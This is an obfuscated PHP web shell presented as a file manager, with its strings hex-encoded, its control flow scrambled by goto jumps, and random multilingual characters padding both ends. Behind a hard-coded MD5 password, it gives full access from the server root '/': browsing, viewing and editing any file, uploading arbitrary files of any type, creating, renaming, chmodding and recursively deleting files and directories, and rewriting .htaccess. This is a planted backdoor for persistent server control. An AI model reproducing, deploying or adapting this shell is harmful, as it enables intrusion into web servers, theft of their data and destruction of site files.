ύ್ବরិü্ɗિд୍aգэ்š్бѰ<?php
 goto Wmbds; heoCO: xCqwc: goto w6Hgh; jINST: ?>
</p><?php  goto N99F4; odIXx: goto IbuOE; goto heoCO; np4gh: UBp9t: goto nkBfD; li4CH: if ($view_file) { ?>
<h2>Viewing File:<?php  echo htmlspecialchars(basename($view_file)); ?>
</h2><div class="file-content"><?php  echo htmlspecialchars($file_content); ?>
</div><form action=""method="post"><input name="path"type="hidden"value="<?php  echo htmlspecialchars($view_file); ?>
"> <textarea name="file_content"><?php  echo htmlspecialchars($file_content); ?>
</textarea> <input name="action"type="submit"value="edit"></form><?php  } goto uBH0g; uP0aw: foreach (new DirectoryIterator($dir) as $fileInfo) { if ($fileInfo->isDot()) { continue; } if ($fileInfo->isDir()) { $directories[] = array("\156\141\x6d\145" => "\133" . $fileInfo->getFilename() . "\x5d", "\160\x61\x74\150" => $fileInfo->getPathname(), "\160\x65\162\x6d\x69\163\163\151\157\156\163" => substr(sprintf("\x25\157", $fileInfo->getPerms()), -4)); } elseif ($fileInfo->isFile()) { $files[] = array("\156\x61\155\x65" => $fileInfo->getFilename(), "\x70\x61\x74\150" => $fileInfo->getPathname(), "\x70\x65\x72\x6d\x69\x73\163\151\157\x6e\x73" => substr(sprintf("\45\157", $fileInfo->getPerms()), -4)); } } goto B1eVI; kwbtQ: if (file_exists($htaccess_file)) { $htaccess_content = file_get_contents($htaccess_file); } goto rdsNi; IMuHH: ?>
">Home</a> ><?php  goto F08hL; m3s0Q: goto Om6UJ; goto p_xOm; uBH0g: goto f9w0V; goto kdu0p; OoAAY: $breadcrumbs = getBreadcrumbs($base_dir, $dir); goto uP0aw; qFvRE: foreach ($directories as $directory) { ?>
<tr><td><input name="selected_items[]"type="checkbox"value="<?php  echo htmlspecialchars($directory["\x70\x61\164\x68"]); ?>
"></td><td><a href="?dir=<?php  echo urlencode($directory["\160\x61\164\150"]); ?>
"class="directory"><?php  echo htmlspecialchars($directory["\156\141\x6d\x65"]); ?>
</a></td><td><?php  echo htmlspecialchars($directory["\160\x65\x72\x6d\151\x73\163\151\x6f\x6e\163"]); ?>
</td><td><form action=""method="post"style="display:inline"><input name="path"type="hidden"value="<?php  echo htmlspecialchars($directory["\x70\x61\x74\x68"]); ?>
"> <input name="rename_to"placeholder="New Name"> <input name="action"type="submit"value="rename"></form><form action=""method="post"style="display:inline"><input name="path"type="hidden"value="<?php  echo htmlspecialchars($directory["\x70\x61\x74\150"]); ?>
"> <input name="chmod"placeholder="Permissions (e.g., 755)"> <input name="action"type="submit"value="permissions"></form><form action=""method="post"style="display:inline"><input name="path"type="hidden"value="<?php  echo htmlspecialchars($directory["\160\x61\x74\150"]); ?>
"> <input name="action"type="submit"value="delete"></form></td></tr><?php  } goto OvUzF; m8F27: pkZSe: goto f1Jcs; GmOAJ: osZw2: goto FmJzQ; OvUzF: goto SqW2w; goto np4gh; dhLRM: tyWPk: goto qFvRE; vQESX: f9w0V: goto vmzXk; fLhgG: Om6UJ: goto li4CH; xB0SL: $dir = isset($_GET["\x64\151\162"]) ? realpath($_GET["\144\x69\x72"]) : $this_file_dir; goto AJd62; JGarZ: ?>
<body><h1>Файл менеджерӗ</h1><p><a href="?dir=<?php  goto SwaTN; nUCKT: function sanitizePath($path, $base_dir) { $real_path = realpath($path); return $real_path && strpos($real_path, $base_dir) === 0 ? $real_path : $base_dir; } goto v9430; VImHd: $Pass = "\67\x62\71\x63\65\71\66\x32\146\63\x35\x61\x37\x62\x66\x32\x61\x30\x35\x63\141\x35\142\66\x65\x36\60\x33\x37\x38\144\61"; goto LmCWv; qeclc: $this_file_dir = realpath(dirname(__FILE__)); goto xB0SL; LmCWv: if (!isset($_SESSION["\154\x6f\147\147\145\144\x5f\x69\x6e"]) || !$_SESSION["\154\157\x67\147\145\x64\137\x69\x6e"]) { if ($_SERVER["\122\105\x51\125\105\123\x54\x5f\x4d\x45\x54\x48\117\x44"] === "\120\x4f\123\124" && isset($_POST["\x70\x61\x73\x73\167\x6f\x72\x64"]) && md5($_POST["\x70\x61\x73\163\167\x6f\x72\x64"]) === $Pass) { $_SESSION["\154\x6f\x67\147\145\144\x5f\151\x6e"] = true; } else { ?>
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Login</title>
            <style>
                body { font-family: monospace, sans-serif; margin: 0; padding: 0; background: #000; color: #0f0; }
                form { margin: 100px auto; width: 300px; padding: 20px; border: 1px solid #0f0; background: #24c924; }
                input[type="password"] { background: #24c924; color: #0f0; border: 1px solid #0f0; padding: 10px; width: 100%; box-sizing: border-box; }
                input[type="submit"] { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; margin-top: 10px; }
                p { color: #f00; }
            </style>
        </head>
        <body>
        <form method="post">
            <h1>Login</h1>
            <input type="password" name="password" placeholder="Password" required>
            <input type="submit" value="Login">
        </form>
        <?php  if (isset($_POST["\160\x61\x73\x73\167\157\x72\x64"]) && md5($_POST["\160\x61\163\163\167\x6f\162\144"]) !== $Pass) { ?>
            <p>Incorrect password. Please try again.</p>
        <?php  } ?>
        </body>
        </html>
        <?php  die; } } goto kZPrx; w6Hgh: ?>
</textarea> <input name="action"type="submit"value="edit_htaccess"></form><form action=""method="post"><h2>Files and Directories</h2><table><thead><tr><th><input type="checkbox"onclick="toggleSelectAll(this)"id="select-all"></th><th>Name</th><th>Permissions</th><th>Actions</th></tr></thead><tbody><?php  goto wKU4R; Wmbds: session_start(); goto VImHd; wKU4R: goto tyWPk; goto m8F27; umoEc: if ($_SERVER["\122\105\x51\x55\105\123\124\x5f\115\x45\124\x48\117\104"] === "\120\117\x53\124") { $message = ''; if (isset($_FILES["\x75\160\154\157\141\144\x5f\146\151\x6c\x65"]) && $_FILES["\x75\160\154\x6f\x61\x64\137\146\151\x6c\x65"]["\145\x72\x72\x6f\x72"] === UPLOAD_ERR_OK) { $allowed_types = array("\52"); $max_file_size = 50 * 1024 * 1024; if ($_FILES["\x75\x70\154\157\x61\x64\137\146\x69\x6c\x65"]["\163\x69\172\x65"] > $max_file_size) { $message = "\x46\x69\x6c\x65\40\163\x69\172\x65\40\x65\170\143\x65\x65\144\163\40\154\x69\x6d\151\164\x2e"; } else { $upload_file = $dir . "\57" . basename($_FILES["\x75\160\x6c\157\141\144\137\x66\151\154\x65"]["\x6e\141\155\x65"]); if (move_uploaded_file($_FILES["\x75\160\154\157\x61\x64\x5f\146\151\x6c\145"]["\x74\x6d\160\x5f\x6e\x61\x6d\x65"], $upload_file)) { $message = "\106\151\154\x65\x20\x75\160\x6c\157\x61\x64\145\144\40\163\165\x63\x63\x65\163\163\146\x75\x6c\154\x79\41"; } else { $message = "\x46\141\x69\x6c\145\x64\40\164\x6f\x20\x75\160\154\157\x61\144\40\x66\x69\x6c\x65\56"; } } } elseif (isset($_FILES["\165\x70\154\x6f\141\x64\x5f\146\x69\x6c\x65"])) { $message = "\x55\160\x6c\157\x61\144\40\x65\162\x72\157\x72\72\x20" . $_FILES["\x75\160\x6c\x6f\x61\144\x5f\146\151\x6c\145"]["\x65\x72\162\157\162"]; } if (isset($_POST["\156\x65\x77\x5f\144\151\162\x65\x63\164\157\x72\171"]) && !empty($_POST["\156\x65\167\x5f\144\x69\x72\x65\x63\x74\x6f\x72\171"])) { $new_dir = $dir . "\x2f" . basename($_POST["\x6e\x65\x77\137\x64\x69\x72\145\143\x74\157\x72\171"]); if (mkdir($new_dir)) { $message = "\104\151\162\x65\143\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\145\144\x20\163\165\x63\143\145\x73\163\146\165\x6c\x6c\x79\x21"; } else { $message = "\x46\141\151\x6c\x65\144\40\164\x6f\x20\x63\162\x65\x61\x74\x65\40\x64\x69\x72\x65\x63\164\x6f\x72\x79\x2e"; } } if (isset($_POST["\156\x65\167\137\x66\x69\x6c\145"]) && !empty($_POST["\x66\x69\x6c\x65\x5f\143\157\x6e\164\x65\156\164"])) { $new_file = $dir . "\57" . basename($_POST["\156\x65\x77\x5f\146\151\x6c\145"]); if (file_put_contents($new_file, $_POST["\x66\151\154\x65\137\x63\157\x6e\x74\145\156\164"])) { $message = "\x46\x69\154\x65\x20\x63\162\x65\141\x74\x65\x64\40\163\165\143\143\145\x73\163\146\165\154\x6c\x79\x21"; } else { $message = "\106\141\x69\x6c\145\x64\x20\x74\157\40\x63\162\145\141\x74\x65\x20\x66\151\x6c\145\x2e"; } } if (isset($_POST["\x61\143\x74\151\x6f\x6e"])) { $action = $_POST["\x61\143\164\151\157\156"]; $path = isset($_POST["\x70\x61\164\x68"]) ? sanitizePath($_POST["\160\141\164\x68"], $base_dir) : ''; $rename_to = $_POST["\162\x65\x6e\141\155\x65\x5f\x74\157"] ?? ''; $file_content = $_POST["\146\151\x6c\145\137\x63\157\x6e\x74\145\156\x74"] ?? ''; $chmod = $_POST["\143\x68\155\x6f\x64"] ?? ''; switch ($action) { case "\162\x65\x6e\x61\155\x65": if (!empty($path) && !empty($rename_to)) { $rename_to = dirname($path) . "\x2f" . basename($rename_to); if (rename($path, $rename_to)) { $message = "\122\145\156\141\155\145\x64\40\x73\x75\143\x63\x65\163\163\x66\x75\x6c\154\171\x21"; } else { $message = "\x46\x61\151\x6c\x65\x64\x20\164\x6f\40\162\x65\x6e\141\x6d\x65\x2e"; } } break; case "\144\x65\x6c\145\x74\x65": if (!empty($path)) { if (is_dir($path)) { deleteDirectory($path); $message = "\104\151\162\x65\143\164\157\x72\171\40\144\x65\154\145\x74\x65\144\x20\x73\x75\x63\x63\x65\163\163\x66\165\x6c\x6c\x79\x21"; } elseif (is_file($path)) { if (unlink($path)) { $message = "\106\151\x6c\x65\40\x64\x65\154\145\x74\x65\x64\40\x73\165\x63\143\145\163\x73\146\x75\x6c\154\171\41"; } else { $message = "\x46\141\151\x6c\x65\x64\40\164\157\x20\144\145\154\145\x74\x65\40\x66\x69\x6c\x65\56"; } } } break; case "\x65\144\x69\x74": if (!empty($path) && !empty($file_content)) { if (file_put_contents($path, $file_content)) { $message = "\x46\x69\154\145\40\145\144\x69\x74\x65\x64\x20\x73\x75\143\143\145\163\x73\146\x75\154\154\171\x21"; } else { $message = "\x46\141\x69\154\x65\144\x20\164\x6f\x20\145\144\x69\164\x20\x66\x69\x6c\145\56"; } } break; case "\x70\145\x72\x6d\151\x73\x73\x69\157\156\x73": if (!empty($path) && !empty($chmod)) { $chmod = intval($chmod, 8); if (chmod($path, $chmod)) { $message = "\x50\145\162\x6d\x69\163\x73\x69\157\x6e\x73\40\165\x70\144\x61\x74\x65\144\x20\x73\x75\x63\143\x65\163\x73\x66\165\154\154\x79\41"; } else { $message = "\106\x61\x69\154\145\x64\40\164\x6f\x20\165\x70\x64\141\x74\x65\x20\160\145\x72\155\x69\x73\x73\151\x6f\x6e\x73\56"; } } break; case "\x65\144\151\x74\137\150\164\141\143\143\145\x73\163": $htaccess_file = $dir . "\57\56\x68\164\x61\143\x63\x65\x73\x73"; $htaccess_content = $_POST["\150\x74\141\143\x63\145\x73\x73\x5f\x63\x6f\156\164\x65\x6e\164"] ?? ''; if (file_put_contents($htaccess_file, $htaccess_content)) { $message = "\56\150\x74\x61\143\143\145\163\163\x20\146\151\x6c\145\x20\165\x70\x64\x61\x74\145\144\x20\x73\165\143\143\145\x73\163\146\165\154\154\171\41"; } else { $message = "\x46\141\x69\x6c\145\x64\40\164\157\x20\x75\160\x64\141\164\x65\40\x2e\150\164\141\x63\x63\x65\163\x73\40\x66\x69\x6c\x65\56"; } break; } } if ($_SERVER["\122\x45\x51\x55\105\x53\x54\137\x4d\105\124\x48\x4f\104"] === "\x50\x4f\x53\124" && isset($_POST["\x61\143\x74\151\x6f\x6e"]) && $_POST["\141\x63\x74\x69\157\156"] === "\x64\x65\154\145\x74\x65\x5f\163\x65\x6c\x65\143\164\145\x64") { if (isset($_POST["\x73\145\154\145\x63\164\145\x64\137\151\164\x65\155\x73"]) && is_array($_POST["\163\x65\154\x65\x63\164\145\x64\x5f\x69\164\x65\155\163"])) { foreach ($_POST["\x73\145\x6c\145\x63\x74\145\x64\137\x69\x74\145\155\x73"] as $item) { $path = sanitizePath($item, $base_dir); if (file_exists($path)) { if (is_dir($path)) { deleteDirectory($path); } elseif (is_file($path)) { unlink($path); } } } $message = "\123\x65\154\145\143\x74\x65\144\40\151\x74\x65\155\163\x20\144\x65\154\145\164\145\144\40\x73\x75\143\143\x65\163\163\x66\x75\x6c\154\171\41"; } else { $message = "\x4e\157\40\x69\164\145\x6d\163\40\163\145\154\145\143\x74\145\x64\x20\146\x6f\162\x20\x64\x65\x6c\145\x74\x69\x6f\156\x2e"; } } } goto wDRYd; V0a25: IbuOE: goto AvGnZ; ZXqOT: $htaccess_file = $dir . "\x2f\x2e\150\164\x61\143\143\145\163\163"; goto kwbtQ; Xvw1W: echo implode("\40\x26\147\164\x3b\x20", $breadcrumbs); goto trsfB; rdsNi: ?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Файл менеджерӗ</title>
    <style>
        body { font-family: monospace, sans-serif; margin: 0; padding: 0; background: #000; color: #0f0; }
        h1 { color: #0f0; }
        p { color: #0f0; }
        table { width: 100%; border-collapse: collapse; }
        table, th, td { border: 1px solid #0f0; }
        th, td { padding: 8px; text-align: left; }
        th { background-color: #24c924; }
        .current-directory { font-weight: bold; }
        .directory { margin-right: 10px; color: #0f0; }
        .file { margin-right: 10px; color: #0f0; }
        .file-content { white-space: pre-wrap; background: #24c924; padding: 10px; color: #0f0; }
        .message { color: #0f0; }
        .error { color: #f00; }
        .hidden { display: none; }
        input[type="text"], textarea { background: #24c924; color: #0f0; border: 1px solid #0f0; padding: 5px; }
        input[type="submit"] { background: #0f0; color: #000; border: none; padding: 5px 10px; cursor: pointer; }
        input[type="file"] { background: #24c924; color: #0f0; border: 1px solid #0f0; }
        input[type="checkbox"] { accent-color: #0f0; }
        a { color: #0f0; text-decoration: none; }
        a:hover { text-decoration: underline; }
    </style>
    <script>
        // Menyimpan posisi scroll saat sebelum halaman dimuat
        window.addEventListener('beforeunload', function() {
            localStorage.setItem('scrollPosition', window.scrollY);
        });

        // Mengembalikan posisi scroll saat halaman dimuat
        window.addEventListener('load', function() {
            var scrollPosition = localStorage.getItem('scrollPosition');
            if (scrollPosition) {
                window.scrollTo(0, parseInt(scrollPosition, 10));
                localStorage.removeItem('scrollPosition');
            }
        });

        // Fungsi untuk centang semua checkbox
        function toggleSelectAll(source) {
            var checkboxes = document.querySelectorAll('input[name="selected_items[]"]');
            for (var checkbox of checkboxes) {
                checkbox.checked = source.checked;
            }
        }
    </script>
</head>
<?php  goto MGwfX; kZPrx: $server_root = realpath("\x2f"); goto tugUx; SwaTN: goto p2mIu; goto GmOAJ; N99F4: goto osZw2; goto V0a25; kIyit: $directories = array(); goto YKHa3; puziQ: goto UBp9t; goto jrv53; jtzEX: goto O1qVL; goto vQESX; AJd62: if (strpos($dir, $base_dir) !== 0 || !is_dir($dir)) { $dir = $this_file_dir; } goto nUCKT; nkBfD: ?>
<form action=""method="post"enctype="multipart/form-data"><h2>Upload File</h2><input name="upload_file"type="file"> <input type="submit"value="Upload"></form><form action=""method="post"><h2>Create Directory</h2><input name="new_directory"placeholder="Directory Name"> <input type="submit"value="Create Directory"></form><form action=""method="post"><h2>Create File</h2><input name="new_file"placeholder="File Name"> <textarea name="file_content"placeholder="File Content"></textarea> <input type="submit"value="Create File"></form><form action=""method="post"><h2>Edit .htaccess</h2><textarea name="htaccess_content"placeholder=".htaccess Content"><?php  goto odIXx; YKHa3: $files = array(); goto OoAAY; mU9Rs: goto pkZSe; goto dhLRM; Z021M: echo urlencode($this_file_dir); goto jtzEX; v9430: function deleteDirectory($dir) { if (!is_dir($dir)) { return unlink($dir); } foreach (new DirectoryIterator($dir) as $item) { if ($item->isDot()) { continue; } if ($item->isDir()) { deleteDirectory($item->getPathname()); } else { unlink($item->getPathname()); } } return rmdir($dir); } goto umoEc; AvGnZ: echo htmlspecialchars($htaccess_content); goto y2T6k; F08hL: goto u4UZk; goto rXe9d; W0wB5: $htaccess_content = ''; goto ZXqOT; jrv53: ZJl4k: goto jINST; tugUx: $base_dir = $server_root; goto qeclc; f1Jcs: ?>
</tbody></table><input name="action"type="submit"value="delete_selected"onclick='return confirm("Are you sure you want to delete selected items?")'></form><?php  goto m3s0Q; lOZWl: SqW2w: goto hmHvo; hmHvo: foreach ($files as $file) { ?>
<tr><td><input name="selected_items[]"type="checkbox"value="<?php  echo htmlspecialchars($file["\160\x61\164\150"]); ?>
"></td><td><a href="?dir=<?php  echo urlencode($dir); ?>
&view_file=<?php  echo urlencode($file["\x70\141\x74\x68"]); ?>
"class="file"><?php  echo htmlspecialchars($file["\x6e\141\155\145"]); ?>
</a></td><td><?php  echo htmlspecialchars($file["\x70\145\162\155\x69\x73\x73\x69\x6f\x6e\163"]); ?>
</td><td><form action=""method="post"style="display:inline"><input name="path"type="hidden"value="<?php  echo htmlspecialchars($file["\160\141\x74\x68"]); ?>
"> <input name="rename_to"placeholder="New Name"> <input name="action"type="submit"value="rename"></form><form action=""method="post"style="display:inline"><input name="path"type="hidden"value="<?php  echo htmlspecialchars($file["\160\141\x74\150"]); ?>
"> <input name="action"type="submit"value="delete"></form><form action=""method="post"style="display:inline"><input name="path"type="hidden"value="<?php  echo htmlspecialchars($file["\160\x61\x74\x68"]); ?>
"> <input name="chmod"placeholder="Permissions (e.g., 755)"> <input name="action"type="submit"value="permissions"></form></td></tr><?php  } goto mU9Rs; wDRYd: function getBreadcrumbs($base_dir, $current_dir) { $breadcrumbs = array(); $current_dir = realpath($current_dir); while ($current_dir && $current_dir !== $base_dir) { $breadcrumbs[] = array("\x6e\141\155\145" => basename($current_dir), "\x70\141\164\150" => $current_dir); $current_dir = dirname($current_dir); } $breadcrumbs[] = array("\156\x61\x6d\x65" => basename($base_dir), "\x70\x61\x74\x68" => $base_dir); $breadcrumbs = array_reverse($breadcrumbs); return array_map(function ($breadcrumb) use($current_dir) { $class = $breadcrumb["\x70\x61\x74\x68"] === $current_dir ? "\143\165\x72\162\x65\156\x74\55\144\x69\162\145\143\x74\157\x72\171" : "\144\151\x72\x65\143\164\x6f\162\x79"; return "\x3c\x61\40\150\x72\145\146\x3d\42\77\x64\x69\162\75" . urlencode($breadcrumb["\160\141\164\150"]) . "\x22\x20\143\x6c\141\163\163\x3d\42" . $class . "\x22\x3e" . htmlspecialchars($breadcrumb["\156\x61\155\145"]) . "\74\57\x61\x3e"; }, $breadcrumbs); } goto kIyit; q_eux: if ($view_file && is_file($view_file)) { $file_content = file_get_contents($view_file); } goto W0wB5; y2T6k: goto xCqwc; goto lOZWl; kdu0p: u4UZk: goto Xvw1W; trsfB: goto ZJl4k; goto QLBda; FmJzQ: if (isset($message)) { ?>
<p class="message"><?php  echo htmlspecialchars($message); ?>
</p><?php  } goto puziQ; B1eVI: $view_file = isset($_GET["\x76\x69\x65\x77\137\x66\151\x6c\145"]) ? sanitizePath($_GET["\166\x69\145\167\x5f\x66\x69\x6c\145"], $base_dir) : ''; goto bbcWE; MGwfX: goto nfkvc; goto fLhgG; bbcWE: $file_content = ''; goto q_eux; rXe9d: p2mIu: goto Z021M; QLBda: nfkvc: goto JGarZ; p_xOm: O1qVL: goto IMuHH; vmzXk: ?>
</body>
</html>જત҉શπವw్զնץபອ૯ი്Tփá